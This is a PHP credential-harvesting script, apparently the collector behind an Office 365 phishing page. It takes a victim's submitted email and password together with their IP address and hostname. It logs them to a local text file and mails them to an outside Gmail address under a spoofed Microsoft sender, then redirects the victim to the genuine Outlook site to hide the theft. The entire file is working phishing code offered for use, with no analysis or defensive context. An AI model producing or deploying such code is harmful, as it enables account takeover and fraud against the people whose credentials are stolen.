<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "Email : ".$_POST['email1']."\n";
$msg .= "Password : ".$_POST['password1']."\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName: ".$hostname."\n";
$msg .= "\n";
$message .= "--------------ReZulT By TeamSLake------------\n\n";
$post = "tricees22@gmail.com";
$fp = fopen("use.txt","a");
fputs($fp,$msg);
fclose($fp);
$subj = "Office 365 - $ip\n";
$from = "From: Office365Team<noreply@office.com>";
mail("$post",$subj, $msg, $from);
header("Location:  https://outlook.office.com/");  

?>